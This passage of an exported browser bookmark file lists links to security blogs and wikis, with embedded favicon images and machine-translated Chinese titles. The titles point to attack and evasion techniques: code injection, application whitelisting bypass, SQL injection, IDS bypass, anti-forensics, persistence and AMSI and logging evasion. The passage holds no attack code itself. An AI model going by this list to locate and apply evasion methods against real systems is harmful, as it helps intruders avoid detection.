YH1mUjlLn4vETUyyXpmiZ19HmN6YnLCaIrjltYFnVT8geGF2lPtUH3sgLX24MzuUdmYwR9e+VNfHbOX7znF3OnehKKaW2ZbMjn45N8Ry783a0UbW49UNfPdyIsAWLyfWsa9H39VQx7DvYcF3ymmvy2W+Odf/vDGzli8fe9b+07ac7fW0gMWcbNANDvxs1LYwD0X+yVPmDV00MbO9GRhNasvFQOTz9b7Lp1/lv5n9KXiD7WgWk7Vawjwzo4I/DFZ5IJbXAiATJtotaqp66Xnqd6TbyeOxgcGx7bMBqmSkpqOSXIA2aX/AdasdFrRX6NLAAAAAElFTkSuQmCC" target="_blank" rel="noopener">小刀志</a><br>            <dt><a href="https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/" add_date="1523625853" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAD3ElEQVQ4jVXTfUzUdRzA8c/393S/+/3uCe6wO04OlONp0eB4DB0VNIlBtNL0j5ogylBXUrjYiFFeW6jLYjpdxVpbGLO53G7E0igKkWKKSSgwEMYhdygccMc9P/2e+qvNXn+//33j8D9jiZ1fUKds3YqjrKU682agia19tsY9P+g9WbOvgMmuKNtVWmeR3+qffAwACAAAkyRAVitg0mLZy5OjZ9qaKx42JCqDe41M6AgAdvnGplQPnCdSYnJVMWLGC/lapkdazMkAAAkAEAYIkNUKIoj87ry0jbYUFe+ErbUGcQ1Vg5y3iwbsHfTue6krT1Y6T//0xvXZFfMgANMhLTxXBgASkfTaKX3ws+GKyoslJtcqF64q5BW3HNWlE3/rBWQIFUuCAgORbwI2J9/Z8fw9sPvPzXsOW4bntp9467jJhaDiwqXcVO/+Wa8WF6J0IsTjPDBSkKG5mXCEtGQbgzSKiJFMg2u5yBzJsN1NOX+v4fSPx+588PM3vyVfxbGsV3pdPiUnEZgOERzCZRho5JFvUzRh2Iho8/dkr2B6jZ+69gsLw/Y81WqIKF4XmpScZCqc9Ya34ZJ27w5Qi8UEidEgioKI4Vg0jmVvbFEjgDDjtEMVnl5T+oH3OUBFyoHjHUatKiFVo4skKBcGiEdfXpnO6aqbi3i1aUDGk4AlgIQYv37u+k5aCJXTZKAIxGiK+exHoowkykmRE9b9gv53p9NeYJKqiFQtdSJ86bZ6aAYe9v6VPtU3vgNoJh4lcVXiH0vaxkmnXO6LyaJ80FXIyBQlSTrtkkG9vh4g+AUKohg61N5d/enB6XYjO1Ye45hB5viRLCBEDeKj4wKuiAFF1YLA8YBLNMRDPxjSjN3NxeNd1hdvGrpHC6dwD2uS+aRDWcnJ9c4rY9spx9oC6nx9sZ8g8TEZI5R7IooUHI/iQFAIl1EoLFCtdo8m523LfODBTPwrbLmrL8GQMGw4eyNUhpGl8vcr6cWWXY+kjrolczBG+Dg3HeaCtF8MgA8BIJqEcJGeXwiHEs58fzE4iKSXgOhpqt937JqlB9z0h+2NEVourrZ+XDk6YJszFTxxK8wqOra5c1uA0dGC4/xQq0xBiVuft+2pA0BxBAAgXX6G7WWO1p/s06R73PLHwMuzW968j1/Y/wAHn/1PAEQBq2wBif3ONlEz92pe/zI5eXcKHQARBwD4xBbibNLIP1fVtRObmz6xMJdNytDnqAEvvZOedHsG1X49PeRlOX+A9zXuHriPm2emUC6I8N+ST5MAEFiBhMMHK+bXaE+memRJ19GscwdIAn41LAIciDzd/wuyWq5VA2a+OwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">发现新的&#39;早期鸟&#39;代码注入技术 - Cyber​​bit</a><br>            <dt><a href="https://subt0x11.blogspot.hk/2018/04/wmicexe-whitelisting-bypass-hacking.html" add_date="1524023296" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA3klEQVQ4jWNkgIJ/aUz/GUgATLP+MTIwMDAwkqMZ2RBGcjXDAAuGSEQPA4NFAgMDhwBC7MIGBoYlKQwMXz5gugJDs0MBqmYGBgYGgwAGhow1WF2AaoBFAoK9IAGCf0BtVXFgYJAxIOAFmM1rChgYTixBiCcsQLiEgYGB4ckFuBRqIM74g9WZGCADYS8THmVEAcxYYGCAeGHPFFQxlxwGhpAJBAz48QESDiETMKMMpvkHqjiqAScWQKKRgQERcOjgBKo4qgErSiA0ekKC2XxiAUINFFCclCnPTDAOudkZAEkvQ+XgMBz1AAAAAElFTkSuQmCC" target="_blank" rel="noopener">subTee：WMIC.EXE白名单绕过 - 用样式，样式表黑客入侵</a><br>            <dt><a href="https://www.sec-consult.com/en/blog/2017/04/application-whitelisting-application/index.html" add_date="1524102849" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADKUlEQVQ4jY2TX0ybZRTGn/d9+wGlRSwd62wHEVDJgHRzyGQbc9FM480mW/ZVZbtwf1zCFVdmLIvyxsTMC6PGJZouMdsuiPJ9hsSVmM0ZCQGXxXQzENoApgyKCGbsT6R/KP2+93hhVnHzwufqnJMnzzkXvwP8h6SUHAA+/vKr/ecjP7Svnf0vEREDgDNfXBj5Zig6snb2sB5J1Q1DMMboyDvv7rZsa4fLXbaj/9rYbsYYSSkdD/sdUkre0NPDYJqI6zpJxmyiqHa+b+bUcjqHfGoZVf713UTRa4w9l5dS8lgsxnRdRzwef/QsymZrwr3G+6PjE4c9RWllWRZS9Dh/Nrjp4vE3Dr7HnM7kWj+7MDC0L1BVHVjJZuoCAX/19avfNSfGfqrt3DpnB9Q4B+OYo0YVHq0WG+uCCeZy3ZyZmZ11Op3Tvg3V846l3+f8uUzqc896H+4u/IbRGz/jw10TlmvxR5G2/95SIxL81PN7rNMjRXUtbW119Y1BVFb6YCurU3wf6Y/WPFN/M5dN753+dVo8VTyndhVfdtxfsaBpDFwwZCwGr7gtEiu1eVHZhC3bWjMA9Nd2bu7lumGIsx/0RPw+75tCOFLlJXkG21acAyACEYFzALalyktsblkq5S4t7nhl69OXDIMEN0MhW0rpOKofGCh3ameTmXUCpV6ucgRinMA42TkCSir4/KpP8JU/P2na8FhEDg46QiFmP+BAQUre1XnkykLWbUeWXlDeQICVMkUupmjdxip26c5L6o+M0w4dePmKlJJjaEgBwD9gSKmutr9VGTrcwS+Gw1bi3qt2q39JIyIMj3vyk/c9aHtxs+PMub4nPpJSQddFgcSGhh4GAJnU8qYMaWrbzu1a2tOifZ1sTZoLbcmKLQe1Q8ff1hbvppQgux4AdOgoXKDrUADgKnM3zc9Oi6lbycma2ic/Pd2xvR9l5eKXe97223eWuoLNLfXXhweDAGA2xgkmUCDRiMWK0onFvmRiKlqyWvTZyZPHltcS9+3IRJm7orRrZmqy+XLvuddN01z9F8LhcFjr7O72FJ5KN0Qh3KBCPTA85jlxIqw96P8CAdNcz+xyVFwAAAAASUVORK5CYII=" target="_blank" rel="noopener">滥用NVIDIA的node.js以绕过应用程序白名单| SEC咨询</a><br>            <dt><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" add_date="1524802316" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACnklEQVQ4jT2SzUtUYRTGz3nvez/GmdEcZzTz2zFFCfGD0XSIyFoELRyCaDEQBEIQbYSohZsWLYL+gzatCtq4iNoUIVrkB6QROZpjNJCN46ClM87MnXvv+54Wd2pzVr/D85znOXj76WsiQkR3Gv6a/H5W2GVArKk/BUDlYkEKhzHFBTgAVGjGSMoPz59sL8/bpslU3npmqGPwbHJlITIZrw42CMcGAA4ARAREqm7MPrx7lE1P3n+k6gbjPLk49/LxDDKMXp+SUrgKDACIJNeN9NbXn+urY9du1nd0616f5vGMXL1x+c6MwjVAQEREBAAGACSl6vEkl+aRMbN4DECOZUlHHB9kOyPRQHObbZqubQBQIrE4ECBjtmUmF+cyW4nqhsbmvgHHtoRja3oV46o/ENK9fiKJiEokFgdEYduhtq5McuNgJ7W9tFAu5IOtYV8gaJVLgcYW3esjKdx4lEgs7pojIXqiE9lU8jCzs7u1vvn+rbCsk6f79CqfY5nImIspkVjcPV8KgYz1jF/01gQy3zfN/NFO4vNuct1XG6xtbBGOBciAqKJARFxVpRAkZVNvf8/4BcZ5JrmRy+5++/iuZ3zC468hIZAxJRKLk5SM8/z+HuNc4dwum5rh6R49H2oN/9r4YhULWpW3Y2jMNkvwrwdSdSO9tb69sqB5vEBEUub298Ij5yampgGgcPhb2g7A/x4QARARU2vLiqohY1IIACzlDpt6+wGAaxrXNCJZWUAAKYXhq/6xuvjp1QtVN3y1QX9dyFtbtzL7DADCw1G7XAmKAwAQIWK5eNw+MJpaW9pJrJ1oaLLMUuHPfja1fWX6QfvgaCl3yBRORJVvdWwr1NbVORxVdeNoL51YeGMVCx2DY5du3dMMTyl35NKI+BeX7UiNzOYAsgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions · security.szurek.pl</a><br>            <dt><a href="https://sqlwiki.netspi.com/" add_date="1524802324" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACd0lEQVQ4jW2STUhUcRTFf/f/niNBpZlkieSotYkanx+RtXgMAy0SsY2Yq4hqE1ZoiwgXRYvCTW0SrWjbRlqEaUhY2AQpOOKMRB9QNFFBpOGixI+Z924LZ2xG+u8u59x7z7nnD/958SqnLx503if2hCo2YomqutZE0JlPVIYiALKRMBN0+gXOASh8MrYfrv04+y3brKqPgAJgSdRvyRuQqAxFVMzzvInCtCrDmW2XgU3/IH6ZbDFbVeeGvsyOKwzktH/3jOm4WFY42Fnu96tyFvAyWAqR0wYgHqzr9VVfxoNOn5OMn18bIl89y4S7y9gtxotZGnjdvbMwqspJYElE2mo/zwxZM0HnpsCVjKSDP4p37gB6gKWuXfYfVJ4CmwRKfNHjI0V6rfk3y04yfg/ACLTlW5YWL2DZa5XvbvBcY6nZn8s3YvsRhU/rni2J2CtpV8C9HtjSqyLrN1HVc3d+pt4KNGcjFoDEnlAFaXM7bZke29d961EJDxcqi09dW1l8oGisb271sZ824wI12Yg3xlivYiYzOWd0660LZYE3Wz2iN+ZSo8DenJYP6zGGw2Hb9rwkyPscQgphHGDRsnyFsdyFCGMWgNvU2Kre6tRIkf3u6KpcNR7HgBIRaesqsSawuaviH5rRlTNu2pSD1CsM1CXjneI2NbYiZL+nB3py4Ovy6EogUH1pm0n6AXkBHMjsfFJduLm968uC63xOPAMQ93DjPLA9R9gS6P2MxibgUJ5slRPRyanBbGkjfjtqhlnLO4XSEZ2cHgIINzSU5ikQfRidiD3KPwPgHqmPoGYQ5XR0MjaUSwg3NJRqAWO+yOyridgpwM/F/wJMO/Ws4Cq9JwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">NetSPI SQL注入Wiki</a><br>            <dt><a href="http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/" add_date="1524889656" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACaklEQVQ4jTVSTWsTURS9976ZNzOZSdLa1JRWNwpRi6gguhL/g+LWlf/DXyDi1rXuXfpVURAspSpYqNVKW0xbDU0zGZN+zMx7714XSc/6cM7hnIMiIiIAgIgwhoAAixAiIIoIIo44AIDMPGIP8uLIWBCYiIJBYRigMLZRCSraFwA8UfQEAEVYpHdwHIfaiez0+sd5XtMkXnhoVEX7cKKPiIQAgGiZfUXTlahZiw8Phqvfv79dWPiX9mpRCACWmYgQQEQ8ESEi7Xmh7+XGlAKWGXyNcU2UevR+ebObnm9M3L8+P1uvKkJCxP5R/u5Xe6n9tz04tABJoCM2s5OTzVq8mWbb/4Zfd/cGRZkd54joIeLrH1tPPn5d38+e37lN1aA09g9F651+Gu/5gIO8XOukk1HoEY0j/c4Gjvnuldba+nowM9WcmZmePv0lK5Z2u63GRD3SzCAAhnns4BN93tieiKIHt+ZvXmwpz7sMcO/aBeOcItrcz3LrSusS7YsICHO7P/jwq/16baOTZsxsrTPWFsYYa0VkcWvnxuNne8NDEXHOeQBwKgri2elKoGlUN4oC8hQKgGO+1Jy6frY5yItGHI2X7h7l/V7vIOtfnZ9XihCxtK6XpkklqiYJgAzzEgCSQAMAoUio9TBLf/z8ORp/o5s+fLO4srr64uWrNMuYJQl0NQxGpyJBNNYeo5dMNVgEEZ8urnza+lOvRPv97Mu3FSJiZubxBT0WqWv/VFLJuuic9T21vN1RiK3z52bm5rTvl8YoIuesUgoR0TlHiMxclqWvNREttzsIcCakvCiISBHFcVyWZb1aDcPwP7ivaEFe4cH8AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Hexacorn | Blog</a><br>            <dt><a href="https://www.hackers-arise.com/single-post/2016/06/20/Covering-your-BASH-Shell-Tracks-AntiForensics" add_date="1525601719" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAHUlEQVQ4jWP8//8/IwMFgIkSzaMGjBowasBgMgAAZ6YDHjftVz8AAAAASUVORK5CYII=" target="_blank" rel="noopener">涵盖BASH Shell曲目 - 反取证| 黑客-出现</a><br>            <dt><a href="http://seclist.us/ids_bypass-intrussion-detection-system-bypass-tricks.html" add_date="1525681538" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADNklEQVQ4jV2Ty2tcVQDGf+ecO890ZjKZZNLOhFrTPBoSQS2xcVMXpRvxAZb8BYIiuijiVnAjiG6LuK6rJm5cCJYutAqK0hZp06hVzPs1mczcmblzX+fee1ylaL/17/etvk/wRBbfulUKdbAQy858uWpVpZBO+7B5fyR1584X792oWUauiNlu65i3HotLS2q6dfZya99933W4EGhVqNZLQlkWubzwu425Rz+s/Ja9OLW2cnR76GrlpdYWgAJYXFxSU9XS26dOp6/JOJlTwsoIJcVAOUMqlyIMtHWudm9Uxe3K5Ghjxumb9MIr/s3lZYwFMDgz+NpgJftx7DI4MjRKacij1ZEMDFs4fY0QMS/M3GdE/g2Ajsyr1X7hBvR+lPOL352MyXzgdNSg75YpjOSoTVvUJvKolMIkkLE8hksO02eOUBLiiDE/iK9e/4wBS+JePmgMPG+l8oxWBZHwEVpisNBRjEh8zo/vkcQGARgtMbGRcWzO+06mLgPPudjphdmeq+n2jjhsBvQd8HzwvJhiqsfC9CFJFGKMIHQFWhvixIggNFJqzx5zezb7+x3S+TSpXJquY+jYAX/c3cQ/XKdW2WO8fkgSSZy2IIwNG7uZ7F8b1ril3XaAiTBF8IM8/zzqkhgNRERhB2V1Mck2uXQfbSu6HYPOJCDicqkQDFuhZ6/G2ns9czpLY2ed/S0b7QeYOKJ8ok1S26TV3uFkQWNv5zEqIUoM+Uz0p1TxTzLyOzfDfqvpOU3yJ2LGZwpksj5J0kOlI2Ynt9jYaOHbCntXkRtKODgybDfUbbHKuiyp5s/E/a8LRRBCY0zI2ESFp86NMFw1mLhNveKx+yDPwJDhyEloHJkDJbn+0fdE8uHD5dB3e584tv1rr23jdnu4PQe/77K7m+D1Bdl2BhFJoiy0OsYvFc2nUcW793jKbne1lctP/GKi6KwOvDOh68nADQj6LvMjmlOqiy4m7DTZ63vhl5Err737YegAiP8+sV6/VBEquBJG3TfKlfIzl8az1amS0xRTlfWD/bVbzz198O2zM427ky8THDv/KzjOhQmK77w48aZuBbNfrcjPfy/OrW0++MYGzJPsv3XcsIGkT5C8AAAAAElFTkSuQmCC" target="_blank" rel="noopener">ids_bypass - 入侵检测系统旁路技巧。 - 安全列表网络™</a><br>            <dt><a href="https://ridicurious.com/2015/03/20/powershell-cmdlets/" add_date="1525924564" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADT0lEQVQ4jVWTTWhcZRiFz/t997s/c2cykzvTTBI1Jo1QowWtRQ1FdFEVBbVQEKSWVkHUpRsFF4oKrgr+UkRQBBdSdFF0I6ipWgSpIaU1RZIYU4yThDSZDJk7P5l77/e+LqKgZ3/O4jk8hN0QAImiqG8wqrycQZ4nq4upB9FsIb0Mrmc2EvB7iwuLpwCk/3bonwGMXz9+k8m5Z1jRwbyIDLgGa90OCr5BLkrwx2pMSheg2Pmx3W0/WavVVgCQBoCxsbGq63pTINpfSDrpM6ODdDiK6Bbj0n2DXXrhlTyG93ly/ty1zHNLex3t3AuFM51OJ9EAUK1U33WMuT/rxcmjkwVz+G6mnl2j0YmWHHq6hdLIMh04tIdWakpdvBwnubA44jku1xv1czQxPrFfOfiFxXjF4jY+Oe3j5vFESacrUDtELiPJuuIEEU1PB3ziuSa0vg6CdKvVbd3uWLKPGccNCmHJVspKhWEdSOsi1CEhgHouNAkpxBJFGoHvUrdnRWuqhEH4oMqH+YOlUr8EgY92O0Hc9iBGkzIBtFdGpoNd4EpR7ZqmnSSFMsQWmVixd6hyuVxRSoPAaLdIvvneEhVHMDMrOP9DHme/clHbdGBNFV+c7aKXGCISECkQUaS0NjERwdpUAr9KX36ek2+/yzC0bwAz0w3E9R0M3DiCjz/sYurrDnJBUSxnu98z6sq4+hIzE4uQIIPVIU6/syGplHHrpI8D91RxZbaI99/elCA3LFYYwqKYmRg8ox96+JGd1drKMQgc0QLlA40Gq3jLiB8a2o59+ezTJpaWicgviAUDChCSjSzJXiRpNssPHDn6lrVyIrVJwjoxRAny6KOR4bLEcZPml35HVxLJSIuInznacW2Wvb44t/iaQqFgjj9x/A3tqAXHGFeLmyJzWQc+s1cCe5GQXxQrIRNCa7RxOZOf40Z8CgCpubmV9OSzJ1t3Td75OLG65FK/qySv/1ybVU5pXvKDy9Jsr5JCn9bcb9hiKt3ZOrq+vt4GABIR2vxrc6hyQ8VeuPCrefWlN59aWf/tWMLbewHlMQugpKupOM9p6aPFqz99AID/Z6OIBGtrjT3OULY1QAOtahVhf//4bRYySkQMy0sLC1cvA+j9V38A+BuhtpWlXdgWXQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Powershell : Command your CMDLET&#39;s - Ridicurious</a><br>            <dt><a href="https://rastamouse.me/2018/03/a-view-of-persistence/" add_date="1526346116" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACvklEQVQ4jX2TT2hcVRTGf+fe++bNvElmJtaYEMSJkOpGcFsQJAtBobYiIm505cK94MaFjhZ0YXe6ibgzblQEowgikm4CEaFSFGlsUbF/xjpx0uRN5r157917ukgMVtQDBw7n8J0/38eB/7GhftXWS73WQHX673ld77m/YrmtoAgsWzinXD7zMVYfZryvNJdKNH2P1gMj3P3vSqe7858NRFD96Z01ZrJTfHcOrMDiCWg6sA3YSYdI8TYvv35GPsLLbcBez/DC4quM/nyFkHrUCOoFVeXHLzzFCGaXIh46BTfSNRZPPCsHawP0hEvmU8KVx+kPS9p3O52aFzFGQaH/PUzGosmMSlVMOFavsz16zR1Nfq6+xkx8kvPXJwx/izE1pDkL/R8EMZCPYLytMvpDyG5adp0nC7Eb6MVpLn+ySlNO0h+UNI/FxIky/IXw+0WRUByyJWCcCOh4cE2SKjEkC8HdufHGS8Tj01z4eaLYWKpMMQbFyPj6FrX2HLXOHMGXB7eKINZC8KBBHVe+hXYdxNli2CdUE+qzXQGlPtvFRDU0VEdyKUjjrkWlZYVR1TQkd7xFJl/SEAvqfT4WDRUigqk1MDY6AouxiBgwGCaaEfzXRp7YSCmrNWoicWfOJwvHEeOospTxtS2y7auHQht8tqvFzb7HYsirXXn6wudOV5daOHea3CtgjbWEUJEPrqpqwI9T1cp7iSxaeVwURwSgofP64YPPOOKpF2lHj7JTlmpwolqKGFwy7cj3xCUdkZm6QT2u04W9/T0iG2jOf0P+675DcZRVwEgkViFxkVhD3S6gfj4VqoKRX6HaK+guF9z3yAr5+5UcX81ASoeJpnENg6bb0PKkxQpTeUV+Y1PuuXeTrQ3kedIDGs8eOsAHaA+DfvbYk3r+zad0damlm73Wv721ri87XSHS9Z7TfzzgLW1KSlmaK8o8AAAAAElFTkSuQmCC" target="_blank" rel="noopener">持久观</a><br>            <dt><a href="http://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/" add_date="1526473399" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAaElEQVQ4jaWTOQ7AMAgEh4j/vxjJaUKzig8MpfGOx5c5DCYVYNkPMO07jGcW3lWCXVeshAHKBrrlEkDDAXYM+AuXDTT8gferrMZKBpO3sJ6ghi2DhLQACjkGqHpCWofoMK6usfUXFPwClhYgKOf1vFgAAAAASUVORK5CYII=" target="_blank" rel="noopener">Pentest提示和技巧＃2 - EK</a><br>            <dt><a href="https://sid-500.com/2018/04/02/powershell-how-to-get-a-list-of-all-installed-software-on-remote-computers/" add_date="1526805434" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACm0lEQVQ4jS2SuW4TURRA771vNs/YcWI7Mc5mEkUkEAXEIiERIQoo+AU6foIiINFQIAoKShBUCCQaEBTALwARi8jCkkAWjB0ntuNZPJ7xvHcpSH+OdIqDruszs1JKCLHx89vtm9eWV1aF0BIli4XBG7funL902W23AQARAFAsLFxHACFEIuWrxw+8zdW0ZQJLgdxqNT8tvhNEM8fmkAgAAABd12dWtpN+8+KZ//7theMzu82GH/iNtv+juvt6cdmV9Ojp8+nZE2EnQEQCACG0tudR/ffFU7N6Kl0qlsaLxdF8dqqYmz86kUTd+/fuxlFXCPFfYBKis98sZ3QSpKIOyyQOQ6kSZrAtsz9t//q+vFOtGIaJiBoiIlHk7WftlKlRD3tIYFm2HsUJuBqiYxpxEkedDhIxs4ZIwJAyjc2t35thMDc9tbW5sVapZxwnlmAahqVT3GNAQABEJEIEIouYAX81vUbt7+ellUhPfa/WNRWYhu5Y1pBBjdUvKAQAHCRB1x8fSI/1zfjNpmX0lQcyYxmTBMh6UMrnk9pWVNlIpEQAAgAkxjhJSey3UqEbGSiGDGPEycR+3JOYy2ZtoP7hMgoCAA0AgFHP5qWAMAzdMPA8LwoDk7Ba3WlRJmi1Dh85MnxmnpMEEDVABKn0Q+NeNh/UqqOTo0rEK/W9rAnNyPdRHxgsnb1ytVCe7EVdJCJEZCXRtHlwLAy7SLYSqSCMSNc7Urnufm60PHL8tFISiQ4EYCZkfWiiUMih30xzb3o41whCN+wFUcJKEqBS6oAEAEZgKe3SZK+v4BSc4lhpqdb6sP6nstcOg3ZtfcmtVxwnxUodvISArJRpO9bRczuJ8XG7tri2Xd1rp03t5HhhKC1ePnn45fNXwzSY+R+hmUtZ9yptOAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">PowerShell：如何获取远程计算机上安装的所有软件的列表 - SID-500.COM</a><br>            <dt><a href="https://thevivi.net/2018/05/23/a-data-hunting-overview/" add_date="1527124153" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABvUlEQVQ4jYWRy07bQBSG/zNjj+04NwghIlBR0bCKVEV9gLwBCxZd9DX6NH2Jqg/BrrsuUFUkukhLaUjIzbHjjD1zuiCCNGnFWf2L80n/Bfj7BJ45uabJCSrGq3lhkWxuTf4MIFRYqVa7LRNR3fgNV7lWx2z5v4CjAhHsvD3uve+OmPnr/EiWmo5fYhJkMmazZcnmXu3lj3vbUvPuq6Tb7Kc5+Z4quHaeuWYZbwLMHBQrXGgE0c9aUbYPZdXce4uhFkFvpkwarYysWfLJrzac0W6Iy1v+cLHUlq6Xe+qgg+wzwJsAeZWd5fUxjT/dFG7jpN3ELIZLBcnm8RsAPSpVqu8f7Pd75SwNBf1WDqfZEOio6qQQDic33x+wp6FMOjduWXoVwhvL7TTzgfPTOt51Lg37QspNS8xWx8N0WiKEwMnZ64+W7y6uWt+GNceVzLxVK0Rx7xDk6sURqD9OxK9pc5R4d6YY+FEyHmyFJjK5tYaAK7AeRKdADJy45ovJNUAPGZ4AENLZOEv93Rc6026+GJAga2OL6TKO/9ESQG5Q8kJfqjIRkyAiyax1kqbRxOjFNrBKAliAVgUSwHZ9hz9GOcp2qhl3kQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">数据搜索概述 - VIVI</a><br>            <dt><a href="https://www.peerlyst.com/posts/wmi-wiki-for-offense-and-defense-s-delano?utm_campaign=peerlyst_shared_post&utm_content=peerlyst_post&utm_medium=social&utm_source=twitter" add_date="1527731063" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACOUlEQVQ4jWPcFykhwMHEAAMffvyDcJm5+DhltV/cvszz7wuyLIsABxNcEQMDgwAHE7O2m1JwIaesNgMDgxIDw/fXj1+ubvp0fidUNt2Ql4OF8cOPfxwsjAwMDOJ+hYrx7az8YtfPHNm+esmXTx+U9EwFTP2+8kj9urKbgYGB8VyiFNw6GX1rpZKVP798zIvwvHHlooYwm4ogC4OkVubUTTx8/IsrY/XfHES4XoCDid8xkYGBoSot4tmtyxUWAtFa3O6KnO4c969OSGZgYFBwDLvy+hfThx//EHo0rb59/njxxOFEPV5pXmaI9xgYGDgfn/r26rGtm++hxz+Z4KKQkPny6SMzI4OKIAvcWogs489PDAwMd97/ZkIW/XLzuJi0nL6+AYq1HEw/eKQ5ZbUf3bzMwMDAhGzS+2NrGBgYdOy9vv7+j2ytbtEcBgaGrauXSPEysyCb9O33fwYGBmVNXTmHVZyvbzw7tUNc10rQKpRNWObRzcsr5kwJ1eBmhMe0uF+huG8hAwPDl08fefj4GZDA1kXTZve18v3/kqLHC41p3cx+QatQiOr8CI+vrx6rm9gqa+revX75xpWLb589spPlcFfi42RhZGFgYICrZmBgmN5S/urOlRhtHoWfR+7u38/z5a+/CDOPJJ+CANTxLCIuyXDV3WUZO9csidTi1hRh/fDjn44om44oeqJk+vX2CVz1llWLI7W4TSXZkcMaPUL2RUr8ljfbdu/7xROHI7W4VQVZsaZ2OBcAsL/tmnRTUlEAAAAASUVORK5CYII=" target="_blank" rel="noopener">WMI wiki for offense and defense by S. Delano - tools, enable, operations | Peerlyst</a><br>            <dt><a href="https://pentester.land/list-of-bug-bounty-writeups.html" add_date="1528903494" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABbklEQVQ4jc3TPWtUQRTG8d/clw3sBmIQy1SW6awtbET8APkGNmKbl/Z2kQSxsBHtbCy2shQb0c7CRlCC2FgZQgphc43ZvfdYXLK7kS0UG59mYJjzP8+ZeYb/VlHJ/uRcmhbsG+hLjkxS5fQC6Iq+e04S8TsgmxaHj346suwwHvoQe+6AgRtqX+26ushBZ/NEKKxpvMGW1qFlT2PPNY2J3KrQg4iZ6xngWCMHr9OmJw7c1hhLrsuMhEALKV0cowCXnW+vxn0rCneVSrVPMktCknedI6R5SOegVhobyW3KfVPYVXucdrwSVoRWI0V36efrnIO+RmZJ46XwzJmDtO393FuF0o9EWDjCscYlPeFt2vIcYkOehhqtkCRj6/FAaayUTOz4nGiLuS4wiA25dTkmhsiEXIYXQqOn0PiusqYy6gCPnNl3E1/SUBND7TQ0tXf6biGThFamdYp6US7+WrMoVzKVWBTXRf8iVV0u/lm/AIlnhjDPYcMeAAAAAElFTkSuQmCC" target="_blank" rel="noopener">错误赏金书写列表·Pentester Land</a><br>            <dt><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" add_date="1529329683" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAB1UlEQVQ4jXWSTWsTURSG33PunUySZmzHxhQqFhmbEqViCVS6UDci6s6NuPcPuHQvrvwF7rvvViiCOxEKdVcXltKFUdKakthkkvm497hop5lIPLsD54H3ee8F8kOkmAF9vqBApBmUP1ETAJNYcVRxtX5lLfDJmk44JIbI/wDhW0vzm+8evXreePFsxdEz258PWLFYmQqQo/j9m8f37swO4tRE0lj2dvfah61TyoXiLDwAaTaqzZuz3Z6Y1BHHqXmlzbdP1tcWRHDB6Cw8jKB+wy+6Eov+3el++PjDr3ir9drV6uUdtIlIRMaAEAEy55VcrcMorS54W9sHX78dlV09jCwAm2lkkc6FtIJrLBVL9Ppls0AURhac6+hCmohEsBzMPdxYNGYURfp24Hte+dPOLxIS2H+lz/Lt73fCoWZSRGYUDzfuLjnKWkknnioDAGDve/dn+4/SRUiq+FLvqG8TCzhTgDMH33cqFW2NECgyg+C6X5t3gWQKwEwAnj5YCRaLxsbiupGk12r6/noAgHkMZLUCALphcnw66oehistkuDdCfxABjJx0BogAaLU6X3aPk8Sw7ac6Vigftk9AJOP7ia9LXqU046pEBDAsVCB1EiXDMEWuqL+u1MVGV/bvoAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">探索PowerShell AMSI和记录逃避 - MDSec</a><br>            <dt><a href="https://legend.octopuslabs.io/" add_date="1530000729" 